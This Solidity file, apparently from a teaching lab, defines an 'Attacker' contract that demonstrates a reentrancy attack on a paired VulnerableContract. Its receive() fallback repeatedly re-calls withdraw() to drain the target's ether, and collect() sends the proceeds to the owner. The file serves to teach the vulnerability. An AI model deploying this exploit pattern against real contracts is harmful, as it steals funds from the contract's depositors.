// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./VulnerableContract.sol";

/**@title A sample of Reentrancy Vulnerability
 * @author Belen Iniesta
 * @notice This contract is to force the Reentrancy Attack
 */
contract Attacker {

  VulnerableContract private vulnerableContract;
  address private owner;

  constructor(address vulnerableContractAddress) {
    vulnerableContract = VulnerableContract(vulnerableContractAddress);
    owner = msg.sender;
  }
  
  receive() external payable {
    if (address(vulnerableContract).balance >= msg.value) {
      vulnerableContract.withdraw();
    }
  }

  function attack() external payable {
    require(msg.sender == owner);
    vulnerableContract.deposit{value: msg.value}();
    vulnerableContract.withdraw();
  }

  function collect() external {
    require(msg.sender == owner);
    payable(msg.sender).transfer(address(this).balance);
  }
}